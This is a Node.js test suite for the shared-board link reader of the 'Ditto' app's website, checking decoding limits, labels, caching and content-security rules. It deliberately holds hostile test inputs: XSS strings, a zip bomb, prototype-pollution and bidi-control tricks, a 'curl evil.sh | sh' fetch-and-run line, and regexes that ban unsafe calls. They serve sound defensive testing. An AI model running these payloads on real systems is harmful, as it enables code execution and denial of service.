// Tests for the shared-board reader (board.js). Run: node --test b/board.test.mjs
// Fixtures are made here with Node's own raw DEFLATE, and also with the iPhone repo's
// tools/board_link.py (python3) when DITTO_IOS names that repo's folder:
//   DITTO_IOS=<path to the iPhone repo> node --test b/board.test.mjs
// (This file is served with the site, so it names no folder on anyone's computer.)

import { test } from "node:test";
import assert from "node:assert/strict";
import { deflateRawSync } from "node:zlib";
import { execFileSync } from "node:child_process";
import { existsSync, readFileSync, readdirSync, statSync, writeFileSync, mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import v8 from "node:v8";
import vm from "node:vm";
import {
  LIMITS, ERRORS, BoardLinkError, parseHash, cleanHash, hashTooLong, base64urlToBytes, inflateRawLimited,
  normalizeBoard, decodeBoardLink, isEmojiImage, countLine, labelFor, textStart, preview, plainText,
  isLongName, textCount, folderCaption, isIOSDevice, substituteTokens,
} from "./board.js";

const HERE = dirname(fileURLToPath(import.meta.url));
const IOS = process.env.DITTO_IOS || "";
const TOOL = IOS ? join(IOS, "tools/board_link.py") : "";
const DEMO = IOS ? join(IOS, "appstore/Ditto demo board rebuild.json") : "";
const HAVE_TOOL = !!IOS && existsSync(TOOL);
const NO_TOOL = "set DITTO_IOS to the iPhone repo's folder to check against tools/board_link.py";

const pack = (bytes) => Buffer.from(deflateRawSync(bytes, { level: 9 })).toString("base64url");
const linkOf = (obj) => "#d1=" + pack(Buffer.from(JSON.stringify(obj)));
const hashOf = (url) => url.slice(url.indexOf("#"));
const py = (...args) => execFileSync("python3", [TOOL, ...args], { encoding: "utf8", maxBuffer: 64 << 20 }).trim();

async function codeOf(promise) {
  try { await promise; } catch (e) {
    assert.ok(e instanceof BoardLinkError, "only BoardLinkErrors escape: " + e);
    return e.code;
  }
  return "ok";
}

function pyEncode(board) {
  const dir = mkdtempSync(join(tmpdir(), "ditto-board-"));
  try {
    const file = join(dir, "board.json");
    writeFileSync(file, JSON.stringify(board));
    return py("encode", file);
  } finally { rmSync(dir, { recursive: true, force: true }); }
}

function folderDepth(list) {
  let max = 0;
  for (const sq of list) if (sq.isFolder) max = Math.max(max, 1 + folderDepth(sq.items || []));
  return max;
}

function counts(list) {
  let squares = 0, folders = 0;
  for (const sq of list) {
    if (sq.isFolder) { folders++; const c = counts(sq.items || []); squares += c.squares; folders += c.folders; }
    else squares++;
  }
  return { squares, folders };
}

const HANDMADE = [
  { name: "<img src=x onerror=alert(1)>", text: "<script>alert('x')</script> &amp; <b>bold</b>", color: "teal" },
  { name: "مرحبا", text: "السلام عليكم ورحمة الله", color: "rose", border: "navy" },
  { name: "", text: "\n  Hello there, this is a long text\nand a second line" },
  { name: "Smile", text: "Have a great day!", image: "emoji:😀" },
  { name: "Family", text: "fam", image: "emoji:👨‍👩‍👧‍👦", showName: false },
  { name: "Flag", text: "flag", image: "emoji:🇵🇰" },
  { name: "Keycap", text: "k", image: "emoji:#️⃣" },
  { name: "Not an emoji", text: "t", image: "emoji:hello" },
  { name: "Two emoji", text: "t", image: "emoji:😀😀" },
  { name: "Picture", text: "t", image: "file:abc.jpg", showName: false },
  { name: "Unknown color", text: "t", color: "chartreuse", border: "dotted" },
  { name: "Black border", text: "t", border: "black", color: "slate" },
  { name: "", text: "" },
  { name: "Folder", isFolder: true, color: "navy", items: [{ name: "", text: "" }, { name: "Inside", text: "in", border: "none" }] },
];

/* ---------- the link ---------- */

test("the demo board from tools/board_link.py decodes and normalizes", { skip: !HAVE_TOOL && NO_TOOL }, async () => {
  const url = py("encode", DEMO);
  assert.match(url, /^https:\/\/dittotap\.com\/b\/#d1=[A-Za-z0-9_-]+$/);
  const expected = JSON.parse(py("decode", url));
  const res = await decodeBoardLink(hashOf(url));
  assert.deepEqual(res.board, expected.board, "the same squares Python reads, in the same shape");
  assert.deepEqual({ squares: res.squares, folders: res.folders }, counts(expected.board));
  assert.deepEqual(res.truncated, { count: false, depth: false });
  const pitch = res.board.find((s) => s.name === "MARKETING PITCH");
  assert.equal(pitch.items, undefined, "its two blank slots are left out");
  const meet = res.board.find((s) => s.name === "MEET UP HERE");
  assert.equal(meet.color, "navy");
  assert.match(meet.items[0].text, /^Let's meet up at noon\./);
  assert.ok(res.board.every((s) => !("id" in s)), "no ids travel");
  assert.equal(countLine(res.squares, res.folders), `${res.squares} squares · ${res.folders} folders`);
});

test("a hand-made board (Python encoder): HTML-looking text, Arabic, emoji, unknown colors", { skip: !HAVE_TOOL && NO_TOOL }, async () => {
  const res = await decodeBoardLink(hashOf(pyEncode(HANDMADE)));
  const by = (name) => res.board.find((s) => s.name === name);
  checkHandmade(res, by);
});

test("the same hand-made board (Node encoder) reads the same", async () => {
  const res = await decodeBoardLink(linkOf({ v: 1, board: HANDMADE }));
  checkHandmade(res, (name) => res.board.find((s) => s.name === name));
});

function checkHandmade(res, by) {
  // HTML stays plain text, character for character (the page shows it with textContent)
  assert.equal(res.board[0].name, "<img src=x onerror=alert(1)>");
  assert.equal(res.board[0].text, "<script>alert('x')</script> &amp; <b>bold</b>");
  assert.equal(res.board[0].color, "teal");
  // right-to-left text untouched
  assert.deepEqual(by("مرحبا"), { name: "مرحبا", text: "السلام عليكم ورحمة الله", color: "rose", border: "navy" });
  // no name: the label is the start of the text
  const unnamed = res.board.find((s) => !s.name && !s.isFolder);
  assert.equal(labelFor(unnamed), "Hello there,", "the first 12 characters, as on the iPhone");
  // emoji
  assert.equal(by("Smile").image, "emoji:😀");
  assert.deepEqual(by("Family"), { name: "Family", text: "fam", image: "emoji:👨‍👩‍👧‍👦", showName: false });
  assert.equal(by("Flag").image, "emoji:🇵🇰");
  assert.equal(by("Keycap").image, "emoji:#️⃣");
  assert.equal(by("Not an emoji").image, undefined);
  assert.equal(by("Two emoji").image, undefined);
  assert.deepEqual(by("Picture"), { name: "Picture", text: "t" }, "pictures and their showName are dropped");
  // unknown color and border become the default
  assert.deepEqual(by("Unknown color"), { name: "Unknown color", text: "t" });
  assert.deepEqual(by("Black border"), { name: "Black border", text: "t", color: "slate", border: "black" });
  // blank slots are dropped, in folders too
  assert.ok(!res.board.some((s) => !s.name && !s.text && !s.isFolder));
  assert.deepEqual(by("Folder"), { name: "Folder", isFolder: true, color: "navy", items: [{ name: "Inside", text: "in", border: "none" }] });
  assert.equal(res.squares, 13);
  assert.equal(res.folders, 1);
}

function nested(levels) {
  let inner = [];
  for (let k = levels; k >= 1; k--) inner = [{ name: "Folder " + k, isFolder: true, items: [{ name: "Text " + k, text: String(k) }].concat(inner) }];
  return inner;
}

test("nested folders 20 deep are cut at 16, the 16th kept but empty (as BoardLink.swift does)", async () => {
  const res = await decodeBoardLink(linkOf({ v: 1, board: nested(20) }));
  assert.equal(folderDepth(res.board), 16);
  assert.equal(res.folders, 16);
  assert.equal(res.squares, 15, "the text inside the 16th folder goes too, as on the iPhone");
  assert.equal(res.truncated.depth, true);
  let f = res.board[0];
  for (let k = 1; k < 16; k++) f = f.items[1];
  assert.equal(f.name, "Folder 16");
  assert.equal(f.items, undefined, "a folder 16 deep is empty");
  assert.equal(folderCaption(f), "0 texts");
});

test("folders exactly 16 deep: only what's inside the 16th is left out", async () => {
  // 16 levels with a text in the 16th folder: that text goes, and the page says so
  const r16 = await decodeBoardLink(linkOf({ v: 1, board: nested(16) }));
  assert.equal(r16.folders, 16);
  assert.equal(r16.squares, 15);
  assert.equal(r16.truncated.depth, true);
  // 15 levels: everything stays and nothing is said
  const r15 = await decodeBoardLink(linkOf({ v: 1, board: nested(15) }));
  assert.equal(r15.folders, 15);
  assert.equal(r15.squares, 15);
  assert.equal(r15.truncated.depth, false);
  // an empty 16th folder (or one with only blank slots) loses nothing
  let empty = [{ name: "Folder 16", isFolder: true, items: [{ name: "", text: "" }, null] }];
  for (let k = 15; k >= 1; k--) empty = [{ name: "Folder " + k, isFolder: true, items: empty }];
  const rE = await decodeBoardLink(linkOf({ v: 1, board: empty }));
  assert.equal(rE.folders, 16);
  assert.equal(rE.truncated.depth, false);
});

test("10,000-deep nesting doesn't overflow anything", async () => {
  const json = '{"v":1,"board":[' + '{"isFolder":true,"name":"x","items":['.repeat(10000) + ']}'.repeat(10000) + "]}";
  const res = await decodeBoardLink("#d1=" + pack(Buffer.from(json)));
  assert.equal(folderDepth(res.board), 16);
});

test("6,000 squares are cut at 5,000", async () => {
  const board = Array.from({ length: 6000 }, (_, i) => ({ name: "S" + i, text: "t" + i }));
  const res = await decodeBoardLink(linkOf({ v: 1, board }));
  assert.equal(res.board.length, 5000);
  assert.equal(res.squares, 5000);
  assert.equal(res.board[4999].name, "S4999");
  assert.equal(res.truncated.count, true);
  // in the order they appear: a folder of 5,000 fills the limit before the square after it
  const big = [{ name: "Big", isFolder: true, items: board.slice(0, 5000) }, { name: "After", text: "x" }];
  const r2 = await decodeBoardLink(linkOf({ v: 1, board: big }));
  assert.equal(r2.folders + r2.squares, 5000);
  assert.equal(r2.board[0].items.length, 4999);
  assert.equal(r2.board.length, 1);
});

let gc = null;
try { v8.setFlagsFromString("--expose-gc"); gc = vm.runInNewContext("gc"); } catch (e) { gc = null; }

test("a zip bomb stops at 2 MB without inflating it all", async () => {
  let hash;
  {
    const bomb = deflateRawSync(Buffer.alloc(50_000_000), { level: 9 });   // 50 MB of zeros
    hash = "#d1=" + Buffer.from(bomb).toString("base64url");
  }
  assert.ok(hash.length < LIMITS.payloadChars, "small enough to pass the length check: " + hash.length);
  if (gc) gc();
  const before = process.memoryUsage();
  const t0 = Date.now();
  let err = null;
  try { await decodeBoardLink(hash); } catch (e) { err = e; }
  const after = process.memoryUsage();   // no collection in between: what was made is still counted
  assert.ok(err instanceof BoardLinkError);
  assert.equal(err.code, "too-big");
  assert.ok(err.inflated > LIMITS.jsonBytes && err.inflated < LIMITS.jsonBytes + 1_200_000, "stopped just past 2 MB: " + err.inflated);
  const grew = after.arrayBuffers - before.arrayBuffers;
  assert.ok(grew < 12_000_000, "inflated about 2 MB, not 50 MB: buffers grew " + grew);
  assert.ok(Date.now() - t0 < 3000);

  // JSON that is valid but pads itself past 2 MB is too big as well
  const padded = Buffer.from('{"v":1,"board":[{"name":"a","text":"b"}]}' + " ".repeat(2_100_000));
  assert.equal(await codeOf(decodeBoardLink("#d1=" + pack(padded))), "too-big");
  // and just under the limit is fine
  const near = Buffer.from(JSON.stringify({ v: 1, board: [{ name: "Long", text: "x".repeat(1_990_000) }] }));
  const res = await decodeBoardLink("#d1=" + pack(near));
  assert.equal(res.board[0].text.length, 1_990_000);
});

test("a cut-off or damaged link is broken, never half a board", async () => {
  const full = linkOf({ v: 1, board: HANDMADE });
  const payload = full.slice(4);
  for (const keep of [10, Math.floor(payload.length / 2), payload.length - 7, payload.length - 5, payload.length - 3, payload.length - 2, payload.length - 1]) {
    assert.equal(await codeOf(decodeBoardLink("#d1=" + payload.slice(0, keep))), "broken", "kept " + keep);
  }
  const mid = Math.floor(payload.length / 2);
  const flipped = payload.slice(0, mid) + (payload[mid] === "A" ? "B" : "A") + payload.slice(mid + 1);
  assert.equal(await codeOf(decodeBoardLink("#d1=" + flipped)), "broken");
  assert.equal(await codeOf(decodeBoardLink("#d1=abc+def/ghi")), "broken", "outside the base64url alphabet");
  assert.equal(await codeOf(decodeBoardLink("#d1=" + pack(Buffer.from("not json")))), "broken");
  assert.equal(await codeOf(decodeBoardLink("#d1=" + pack(Buffer.from([0xff, 0xfe, 0x7b])))), "broken", "not UTF-8");
  assert.equal(await codeOf(decodeBoardLink("#d1=" + pack(Buffer.from("[1,2]")))), "broken");
  assert.equal(await codeOf(decodeBoardLink("#d1=" + pack(Buffer.from('{"v":1,"board":{}}')))), "broken");
  // extra data after the end of the DEFLATE stream
  assert.equal(await codeOf(decodeBoardLink("#d1=" + Buffer.concat([deflateRawSync(Buffer.from('{"v":1,"board":[{"name":"a"}]}')), Buffer.from("junk")]).toString("base64url"))), "broken");
});

test("a newer version asks for a newer Ditto", async () => {
  assert.equal(await codeOf(decodeBoardLink(linkOf({ v: 2, board: HANDMADE }))), "newer");
  assert.equal(await codeOf(decodeBoardLink("#d2=" + pack(Buffer.from('{"v":2,"board":[]}')))), "newer");
  assert.equal(await codeOf(decodeBoardLink("#d9=anything")), "newer");
  assert.equal(await codeOf(decodeBoardLink(linkOf({ v: "1", board: HANDMADE }))), "broken");
  assert.equal(await codeOf(decodeBoardLink(linkOf({ v: 0, board: HANDMADE }))), "broken");
  assert.equal(await codeOf(decodeBoardLink(linkOf({ board: HANDMADE }))), "broken");
});

test("a payload over 200,000 characters is too big, before any decoding", async () => {
  const t0 = Date.now();
  assert.equal(await codeOf(decodeBoardLink("#d1=" + "A".repeat(200_001))), "too-big");
  assert.equal(await codeOf(decodeBoardLink("#d1=" + "A".repeat(5_000_000))), "too-big");
  assert.ok(Date.now() - t0 < 500);
  assert.equal(await codeOf(decodeBoardLink("#d1=" + "A".repeat(200_000))), "broken", "at the limit it is read (and isn't a board)");
});

test("no board in the link", async () => {
  for (const h of ["", "#", "#hello", "#d1", "#x1=abc", "#=d1=abc"]) assert.equal(await codeOf(decodeBoardLink(h)), "none", JSON.stringify(h));
  assert.equal(await codeOf(decodeBoardLink("#d1=")), "broken");
  assert.equal(await codeOf(decodeBoardLink(linkOf({ v: 1, board: [] }))), "empty");
  assert.equal(await codeOf(decodeBoardLink(linkOf({ v: 1, board: [{ name: "", text: "" }, null, 7, "x", []] }))), "empty");
});

test("a browser without DecompressionStream('deflate-raw') is told to update", async () => {
  const hash = linkOf({ v: 1, board: HANDMADE });
  assert.equal(await codeOf(decodeBoardLink(hash, { DecompressionStream: null })), "unsupported");
  class OldDS { constructor(format) { if (format !== "gzip" && format !== "deflate") throw new TypeError("Unsupported compression format"); } }
  assert.equal(await codeOf(decodeBoardLink(hash, { DecompressionStream: OldDS })), "unsupported");
  // a missing board still says so first
  assert.equal(await codeOf(decodeBoardLink("", { DecompressionStream: null })), "none");
});

test("what messengers add at the end of a link is ignored", async () => {
  const hash = linkOf({ v: 1, board: [{ name: "Hi", text: "there" }] });
  for (const tail of [".", ")", "=", "==", " ", "%20", "&utm_source=x"]) {
    const res = await decodeBoardLink(hash + tail);
    assert.equal(res.board[0].text, "there", JSON.stringify(tail));
  }
  assert.deepEqual(parseHash("d1=abc"), { version: "1", payload: "abc" });
});

test("a long run of junk can't freeze the page (no backtracking regex)", async () => {
  // Safari took about 3 s on 80,000 of these with the old trailing-junk regex, Node 5.6 s on 120,000
  const t0 = Date.now();
  const p = parseHash("#d1=" + ".".repeat(150_000) + "A");
  assert.equal(p.payload.length, 150_001, "junk before the last base64url character stays, so it reads as broken");
  assert.deepEqual(parseHash("#d1=A" + ".".repeat(1_000_000)), { version: "1", payload: "A" });
  assert.equal(await codeOf(decodeBoardLink("#d1=" + ".".repeat(150_000) + "A")), "broken");
  assert.ok(Date.now() - t0 < 1000, "linear: " + (Date.now() - t0) + " ms");
  // past the limit it is refused before anything else looks at it
  const t1 = Date.now();
  assert.equal(await codeOf(decodeBoardLink("#d1=" + ".".repeat(300_000) + "A")), "too-big");
  assert.equal(await codeOf(decodeBoardLink("#hello" + ".".repeat(300_000))), "too-big");
  assert.equal(cleanHash("#d1=" + ".".repeat(300_000) + "A"), "");
  assert.ok(Date.now() - t1 < 200, "refused at once: " + (Date.now() - t1) + " ms");
  assert.equal(hashTooLong("#d1=" + "A".repeat(LIMITS.payloadChars) + "&utm_source=x"), false);
});

test("the cleaned link (Open in Ditto, QR code, Copy link) is what the app accepts", async () => {
  const hash = linkOf({ v: 1, board: [{ name: "Hi", text: "there" }] });
  for (const tail of ["", ".", ")", "=", "==", " ", "%20", "&utm_source=x", "&a=1&b=2", ".\u200b"]) {
    const c = cleanHash(hash + tail);
    assert.equal(c, hash, JSON.stringify(tail));
    // BoardLink.swift: the payload must be A–Z a–z 0–9 - _ only
    assert.match(c.slice(4), /^[A-Za-z0-9_-]+$/);
    assert.equal((await decodeBoardLink(c)).board[0].text, "there");
  }
  assert.equal(cleanHash(hash.slice(1)), hash, "without the #");
  assert.equal(cleanHash("#d2=abc."), "#d2=abc", "a newer version keeps its number");
  for (const none of ["", "#", "#hello", "#d1", "#x1=abc", "#d1234567=abc"]) assert.equal(cleanHash(none), "", JSON.stringify(none));
});

test("banner.js gives the Smart App Banner the same cleaned link", () => {
  const src = readFileSync(join(HERE, "banner.js"), "utf8");
  const hash = linkOf({ v: 1, board: [{ name: "Hi", text: "there" }] });
  const cases = ["", "#", "#hello", hash, hash + ".", hash + "&utm_source=x", hash + "%20", "#d2=abc.", "#d1=" + ".".repeat(150_000) + "A",
    "#d1=" + "A".repeat(LIMITS.payloadChars + 100), "#d1=a%2Cb", "#d1=%E0%A4%A"];
  for (const h of cases) {
    const meta = {};
    let onHash = null;
    const ctx = {
      document: { createElement: () => meta, head: { appendChild() {} } },
      location: { origin: "https://dittotap.com", pathname: "/b/", hash: h, href: "https://dittotap.com/b/" + h },
      window: { addEventListener: (type, f) => { if (type === "hashchange") onHash = f; } },
    };
    const t0 = Date.now();
    vm.runInNewContext(src, ctx);
    assert.ok(Date.now() - t0 < 500, "fast on " + h.length + " characters");
    assert.equal(meta.name, "apple-itunes-app");
    const want = ("https://dittotap.com/b/" + cleanHash(h)).replace(/,/g, "%2C");
    assert.equal(meta.content, "app-id=6810430522, app-argument=" + want, JSON.stringify(h.slice(0, 40)));
    assert.equal(typeof onHash, "function");
    ctx.location.hash = hash + "&x";
    onHash();
    assert.equal(meta.content, "app-id=6810430522, app-argument=https://dittotap.com/b/" + hash, "follows the hash");
  }
});

test("the site's service worker never saves a shared-board link", async () => {
  const src = readFileSync(join(HERE, "../sw.js"), "utf8");
  const on = {};
  const puts = [], deleted = [];
  const ctx = {
    self: { addEventListener: (t, f) => { on[t] = f; }, skipWaiting: () => Promise.resolve(), clients: { claim: () => Promise.resolve() } },
    location: { origin: "https://dittotap.com" },
    URL,
    Request: class { constructor(req) { this.url = req.url; } },
    fetch: () => Promise.resolve({ ok: true, clone() { return this; } }),
    caches: {
      open: () => Promise.resolve({ put: (k) => { puts.push(k.url || k); }, addAll: () => Promise.resolve() }),
      keys: () => Promise.resolve(["ditto-v4", "ditto-v3"]),
      delete: (k) => { deleted.push(k); return Promise.resolve(true); },
      match: () => Promise.resolve(undefined),
    },
    Promise,
  };
  vm.runInNewContext(src, ctx);
  const hash = linkOf({ v: 1, board: [{ name: "Hi", text: "there" }] });
  for (const url of ["https://dittotap.com/b/" + hash, "https://dittotap.com/b" + hash, "https://dittotap.com/b/view.js", "https://dittotap.com/b/?x=1" + hash]) {
    let answered = false;
    on.fetch({ request: { method: "GET", url }, respondWith: () => { answered = true; } });
    assert.equal(answered, false, url.slice(0, 40) + ": straight from the network, never saved");
  }
  // the rest of the site still works offline
  let p = null;
  on.fetch({ request: { method: "GET", url: "https://dittotap.com/" }, respondWith: (r) => { p = r; } });
  assert.ok(p, "the web app is still saved for offline use");
  await p;
  await new Promise((r) => setTimeout(r, 0));
  assert.ok(puts.length >= 1 && puts.every((u) => !String(u).includes("#d1=")));
  // a new cache name, so the old one (which may hold a board link) is deleted
  let wait = null;
  on.activate({ waitUntil: (q) => { wait = q; } });
  await wait;
  assert.ok(deleted.includes("ditto-v4"), "the ditto-v4 cache is deleted: " + deleted);
});

/* ---------- pieces ---------- */

test("normalizeBoard keeps only known keys of the right types", () => {
  const res = normalizeBoard([
    null, 5, "x", [], { name: 7, text: { a: 1 } },
    { name: "n", text: "t", id: "ABC", extra: 1, isFolder: "true", items: [{ name: "lost" }] },
    { isFolder: true },
    { isFolder: true, name: "F", text: "ignored", items: "nope" },
    { name: "e", image: "emoji:😀", showName: "no" },
    { name: "s", showName: false },
    { name: "__proto__", text: "p", ["__proto__"]: { polluted: true } },
  ]);
  assert.deepEqual(res.board, [
    { name: "n", text: "t" },
    { isFolder: true },
    { name: "F", isFolder: true },
    { name: "e", image: "emoji:😀" },
    { name: "s" },
    { name: "__proto__", text: "p" },
  ]);
  assert.equal(({}).polluted, undefined);
  assert.equal(labelFor({ isFolder: true }), "Folder");
  assert.equal(folderCaption({ isFolder: true }), "0 texts");
});

test("emoji images: one emoji, nothing else", () => {
  for (const ok of ["emoji:😀", "emoji:👍🏽", "emoji:🇵🇰", "emoji:#️⃣", "emoji:❤️", "emoji:👩‍💻", "emoji:🏴󠁧󠁢󠁳󠁣󠁴󠁿"]) assert.ok(isEmojiImage(ok), ok);
  for (const bad of ["emoji:", "emoji:a", "emoji:5", "emoji:😀😀", "emoji:😀 ", "emoji:😀‮", "emoji:<b>", "file:x.png", "😀", "emoji:" + "😀".repeat(20), 42, null]) assert.ok(!isEmojiImage(bad), String(bad));
});

test("base64url decoding", () => {
  assert.deepEqual(Array.from(base64urlToBytes("AQID_-8")), [1, 2, 3, 255, 239]);
  assert.deepEqual(Buffer.from(base64urlToBytes(Buffer.from("héllo wörld ✓").toString("base64url"))).toString(), "héllo wörld ✓");
  assert.throws(() => base64urlToBytes("A"), BoardLinkError);
  assert.throws(() => base64urlToBytes("AB+C"), BoardLinkError);
});

test("inflateRawLimited reads a normal stream whole", async () => {
  const text = "hello ".repeat(10000);
  const out = await inflateRawLimited(deflateRawSync(Buffer.from(text)));
  assert.equal(Buffer.from(out).toString(), text);
});

test("the words on the page", () => {
  assert.equal(countLine(12, 3), "12 squares · 3 folders");
  assert.equal(countLine(1, 1), "1 square · 1 folder");
  assert.equal(countLine(5000, 0), "5,000 squares");
  assert.equal(textStart("short"), "short");
  assert.equal(textStart("  \n\n  two\nlines"), "two");
  assert.equal(textStart("😀".repeat(30), 5), "😀😀😀😀😀…", "cut by characters, not UTF-16 halves");
  assert.equal(folderCaption({ items: [{ text: "a" }, { text: "b" }] }), "2 texts");
  assert.equal(folderCaption({ items: [{ isFolder: true }, { text: "b" }] }), "1 text");
  assert.equal(ERRORS.broken.title, "This link looks cut off. Ask for it again.");
  assert.equal(ERRORS.unsupported.title, "Update your browser to open this board");
  const out = substituteTokens("On [TODAY] at [TIME], see you [TOMORROW]", new Date(2026, 9, 29, 14, 5));
  assert.doesNotMatch(out, /\[(TODAY|TIME|TOMORROW)\]/);
  assert.match(out, /Oct 29, 2026/);
  assert.match(out, /Oct 30, 2026/);
});

test("folder captions count every text inside, as on the iPhone (Square.textCount)", () => {
  const twelve = Array.from({ length: 12 }, (_, i) => ({ isFolder: true, name: "F" + i, items: Array.from({ length: 10 }, (_, k) => ({ text: "t" + k })) }));
  assert.equal(textCount({ items: twelve }), 120);
  assert.equal(folderCaption({ items: twelve }), "120 texts", "not '12 folders, 0 texts'");
  assert.equal(folderCaption({ items: [{ text: "a" }] }), "1 text");
  assert.equal(folderCaption({ items: [{ isFolder: true, items: [{ isFolder: true, items: [{ text: "deep" }] }] }] }), "1 text");
  assert.equal(folderCaption({ items: [{ isFolder: true }] }), "0 texts");
  assert.equal(folderCaption({ items: Array.from({ length: 1234 }, () => ({ text: "x" })) }), "1,234 texts");
});

test("labels: nothing visible gets a word, and bidi controls never reach the page", () => {
  assert.equal(labelFor({ name: "   " }), "Square");
  assert.equal(labelFor({ text: "\n\n   \n" }), "Square");
  assert.equal(labelFor({ name: "\u202e\u2066" }), "Square", "bidi controls alone are nothing to show");
  assert.equal(labelFor({ name: "\u200b", text: "hello" }), "hello");
  assert.equal(labelFor({ name: " ", isFolder: true }), "Folder");
  assert.equal(labelFor({ name: "My \u202eesserdda" }), "My esserdda");
  assert.equal(labelFor({ text: "A long text that goes on and on" }), "A long text", "12 characters, trimmed, no ellipsis");
  assert.equal(labelFor({ text: "😀".repeat(20) }), "😀".repeat(12));
  assert.equal(labelFor({ name: "مرحبا", text: "x" }), "مرحبا", "right-to-left names untouched");
  assert.equal(plainText("a\u202ab\u202bc\u202cd\u202de\u202ef\u2066g\u2067h\u2068i\u2069j\u200fk"), "abcdefghij\u200fk", "marks (U+200E/F) stay");
});

test("the smaller name size counts the name only, by characters", () => {
  assert.equal(isLongName("12345678"), false);
  assert.equal(isLongName("123456789"), true);
  assert.equal(isLongName(""), false, "a square without a name shows its text at the full size");
  assert.equal(isLongName(undefined), false);
  assert.equal(isLongName("👨‍👩‍👧‍👦👨‍👩‍👧‍👦👨‍👩‍👧‍👦"), false, "an emoji is one character");
});

test("preview: what a tap copies, as one line, without bidi tricks", () => {
  assert.equal(preview("curl evil.sh | sh"), "curl evil.sh | sh");
  assert.equal(preview("My address\n\n  curl evil.sh | sh"), "My address curl evil.sh | sh", "later lines aren't hidden");
  assert.equal(preview("\u202ehs | hs.live lruc"), "hs | hs.live lruc");
  assert.equal(preview("x".repeat(100), 40), "x".repeat(40) + "…");
  assert.equal(preview("a" + " ".repeat(100_000) + "b"), "a b", "a run of spaces can't push the rest out of view");
  assert.equal(preview("😀".repeat(50), 5), "😀😀😀😀😀…");
  assert.equal(preview(""), "");
});

test("Open in Ditto only on iPhone, iPad and iPod touch", () => {
  const ua = {
    iphone: "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    ipadDesktop: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    android: "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Mobile Safari/537.36",
    windows: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
  };
  assert.equal(isIOSDevice({ userAgent: ua.iphone, platform: "iPhone", maxTouchPoints: 5 }), true);
  assert.equal(isIOSDevice({ userAgent: ua.ipadDesktop, platform: "MacIntel", maxTouchPoints: 5 }), true, "an iPad asking for the desktop site");
  assert.equal(isIOSDevice({ userAgent: ua.ipadDesktop, platform: "MacIntel", maxTouchPoints: 0 }), false, "a Mac");
  assert.equal(isIOSDevice({ userAgent: ua.android, platform: "Linux armv8l", maxTouchPoints: 5 }), false);
  assert.equal(isIOSDevice({ userAgent: ua.windows, platform: "Win32", maxTouchPoints: 0 }), false);
  assert.equal(isIOSDevice(undefined), false);
});

/* ---------- the page's hard rules, checked in its source ---------- */

test("the page builds its links only from the cleaned hash", () => {
  const src = readFileSync(join(HERE, "view.js"), "utf8");
  assert.doesNotMatch(src, /location\.href/, "never the raw URL");
  for (const m of src.matchAll(/.{0,20}location\.hash.{0,2}/g)) assert.match(m[0], /(cleanHash|decodeBoardLink)\(location\.hash\)/, m[0]);
  assert.match(src, /openRow\.hidden = !\(canOpen && onIOS\)/);
});

test("nothing served from b/ or .well-known names a folder on a computer", () => {
  const files = [];
  const walkDir = (d) => { for (const f of readdirSync(d)) { const p = join(d, f); if (statSync(p).isDirectory()) walkDir(p); else files.push(p); } };
  walkDir(HERE);
  walkDir(join(HERE, "../.well-known"));
  walkDir(join(HERE, "../link"));
  files.push(join(HERE, "../sw.js"));
  for (const f of files) {
    if (/\.(png|jpg|ico)$/.test(f)) continue;
    const src = readFileSync(f, "utf8");
    assert.doesNotMatch(src, /\/(Users|home|private\/tmp|var\/folders)\/[A-Za-z0-9._-]+/, f.slice(HERE.length - 1));
    assert.doesNotMatch(src, /[A-Za-z]:\\Users\\/, f.slice(HERE.length - 1));
  }
});

test("the page loads nothing from anywhere else and never writes data as HTML", () => {
  const read = (p) => readFileSync(join(HERE, p), "utf8");
  const scripts = { "board.js": read("board.js"), "view.js": read("view.js"), "banner.js": read("banner.js"), "../link/qr.js": read("../link/qr.js") };
  for (const [name, src] of Object.entries(scripts)) {
    assert.doesNotMatch(src, /\.innerHTML|\.outerHTML|insertAdjacentHTML|document\.write|createContextualFragment|DOMParser/, name);
    assert.doesNotMatch(src, /\bfetch\(|XMLHttpRequest|sendBeacon|WebSocket|EventSource|new Image\b|\bimport\(|serviceWorker|postMessage/, name);
    assert.doesNotMatch(src, /https?:\/\/(?!www\.w3\.org\/2000\/svg)/, name + " names no other site");
  }
  const html = read("index.html");
  const csp = /<meta http-equiv="Content-Security-Policy" content="([^"]+)">/.exec(html);
  assert.ok(csp, "has a CSP");
  for (const d of ["default-src 'self'", "connect-src 'none'", "img-src 'self' data:", "script-src 'self'", "style-src 'self'", "base-uri 'none'", "form-action 'none'"]) assert.ok(csp[1].includes(d), d);
  assert.ok(!csp[1].includes("unsafe"), "no unsafe-inline or unsafe-eval");
  assert.ok(html.indexOf(csp[0]) < html.indexOf("<script"), "the CSP comes before any script");
  for (const m of html.matchAll(/<(script|link)\b[^>]*\b(src|href)="([^"]+)"/g)) assert.doesNotMatch(m[3], /^(https?:)?\/\//, m[0]);
  assert.doesNotMatch(html, /<script(?![^>]*\bsrc=)[^>]*>/, "no inline scripts");
  assert.doesNotMatch(html, /\sstyle=|<style/, "no inline styles");
  assert.doesNotMatch(html, /\son[a-z]+=/i, "no inline event handlers");
  assert.match(html, /<meta name="robots" content="noindex">/);
  assert.match(html, /<meta name="referrer" content="no-referrer">/);
  assert.match(html, /https:\/\/apps\.apple\.com\/app\/apple-store\/id6810430522\?pt=118936797&amp;ct=shared-board&amp;mt=8/);
  const css = read("b.css");
  assert.doesNotMatch(css, /url\(|@import|@font-face/);
});
